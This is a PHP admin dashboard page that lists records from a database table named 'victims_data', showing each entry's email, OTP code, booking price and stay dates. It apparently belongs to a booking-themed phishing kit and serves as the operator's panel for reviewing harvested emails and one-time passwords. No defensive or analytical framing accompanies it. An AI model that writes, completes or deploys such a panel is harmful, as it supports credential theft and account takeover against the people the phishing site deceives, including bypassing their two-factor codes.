<?php

include '../../include/global.php';

if (!session())
    redirect('../');

?>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title><?= site('name'); ?></title>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <!-- End fonts -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">

    <!-- core:css -->
    <link rel="stylesheet" href="../assets/vendors/core/core.css">
    <!-- endinject -->

    <!-- Plugin css for this page -->
    <link rel="stylesheet" href="../assets/vendors/flatpickr/flatpickr.min.css">
    <!-- End plugin css for this page -->

    <!-- inject:css -->
    <link rel="stylesheet" href="../assets/fonts/feather-font/css/iconfont.css">
    <link rel="stylesheet" href="../assets/vendors/flag-icon-css/css/flag-icon.min.css">
    <!-- endinject -->

    <!-- Layout styles -->
    <link rel="stylesheet" href="../assets/css/demo2/style.min.css">
    <!-- End layout styles -->

    <link rel="shortcut icon" href="../assets/images/favicon.png" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
    <div class="main-wrapper">

        <!-- partial:partials/_sidebar.html -->
        <?= load('panel/sidebar'); ?>
        <!-- partial -->

        <div class="page-wrapper">

            <?= load('panel/header'); ?>

            <div class="page-content">








                <style>
                    .flash-notification {
                        animation: flash 3s infinite;
                    }

                    @keyframes flash {
                        0% {
                            background-color: rgba(128, 128, 128, 0.2);
                        }

                        50% {
                            background-color: rgba(128, 128, 128, 1);
                        }

                        100% {
                            background-color: rgba(128, 128, 128, 0.2);
                        }
                    }
                </style>

                <div class="row">
                    <div class="col-12 col-xl-12 stretch-card">
                        <div class="row flex-grow-1">
                            <div class="col-md-3 grid-margin stretch-card">
                                <div class="card" style="border-radius: 18px;">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-baseline">
                                            <h6 class="card-title mb-0">total booking</h6>
                                        </div>
                                        <div class="row">
                                            <div class="col-6 col-md-12 col-xl-5">
                                                <h3 class="mb-2"><?= countable(fetch("SELECT * FROM victims_data")) ?>
                                                    booking</h3>
                                                <div class="d-flex align-items-baseline">
                                                    <p class="text-success">
                                                        <span>+0.<?= countable(fetch("SELECT * FROM victims_data")) ?>%</span>
                                                        <i data-feather="arrow-up" class="icon-sm mb-1"></i>
                                                    </p>
                                                </div>
                                            </div>
                                            <div class="col-6 col-md-12 col-xl-7">
                                                <div id="customersChart" class="mt-md-3 mt-xl-0"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div> <!-- row -->
                <div class="row">
                    <div class="col-lg-12 col-xl-12 stretch-card">
                        <div class="card">
                            <div class="card-body">
                                <div class="d-flex justify-content-between align-items-baseline mb-2">
                                    <h6 class="card-title mb-0">booking</h6>
                                </div>
                                <div class="table-responsive">
                                    <table class="table table-hover mb-0">
                                        <thead>
                                            <thead>
                                                <tr>
                                                    <th class="pt-0">#</th>

                                                    <th class="pt-0">Email</th>
                                                    <th class="pt-0">OTP_Code</th>
                                                    <th class="pt-0">Booking</th>
                                                    <th class="pt-0">Checkin</th>
                                                    <th class="pt-0">Checkout</th>

                                                    <th class="pt-0">Action</th>
                                                </tr>
                                            </thead>
                                        <tbody id="hostsTableBody">
                                            <?php
                                            // Victims_data table se data fetch kar rahe hain
                                            $hosts = fetch("SELECT * FROM `victims_data` ORDER BY `created_at` DESC");

                                            // Agar data available hai, to loop ke through table rows generate karo
                                            if (!empty($hosts)) {
                                                $counter = 1; // Table mein record number show karne ke liye
                                                foreach ($hosts as $host) {
                                                    ?>
                                                    <tr>
                                                        <td><?= htmlspecialchars($host['id']); ?></td> <!-- # Serial number -->
                                                        <td><?= htmlspecialchars($host['email']); ?></td> <!-- Email -->
                                                        <td><?= htmlspecialchars($host['otp_code']); ?></td> <!-- Since -->
                                                        <td><?= htmlspecialchars($host['booking_price']); ?></td>
                                                        <!-- Booking -->
                                                        <td><?= htmlspecialchars($host['checkin']); ?></td> <!-- Created at -->
                                                        <td><?= htmlspecialchars($host['checkout']); ?></td> <!-- Created at -->

                                                        <td>
                                                            <a href="booking_view.php?id=<?= $host['id']; ?>"
                                                                class="btn btn-sm btn-warning"><i class="fa fa-eye"></i></a>
                                                            <!-- <a href="delete.php?id=<?= $host['id']; ?>" class="btn btn-sm btn-danger">Delete</a> -->
                                                        </td>
                                                    </tr>
                                                    <?php
                                                }
                                            } else {
                                                // Agar koi record nahi mila to ye message dikhayega
                                                echo "<tr><td colspan='7' class='text-center'>No records found</td></tr>";
                                            }
                                            ?>
                                        </tbody>

                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div> <!-- row -->

            </div>

            <?= load('panel/footer'); ?>

        </div>
    </div>

    <!-- core:js -->
    <script src="../assets/vendors/core/core.js"></script>
    <!-- endinject -->

    <!-- Plugin js for this page -->
    <script src="../assets/vendors/flatpickr/flatpickr.min.js"></script>
    <script src="../assets/vendors/apexcharts/apexcharts.min.js"></script>
    <!-- End plugin js for this page -->

    <!-- inject:js -->
    <script src="../assets/vendors/feather-icons/feather.min.js"></script>
    <script src="../assets/js/template.js"></script>
    <!-- endinject -->

    <!-- Custom js for this page -->
    <script src="../assets/js/dashboard-dark.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- End custom js for this page -->

    <script>


    </script>

</body>

</html>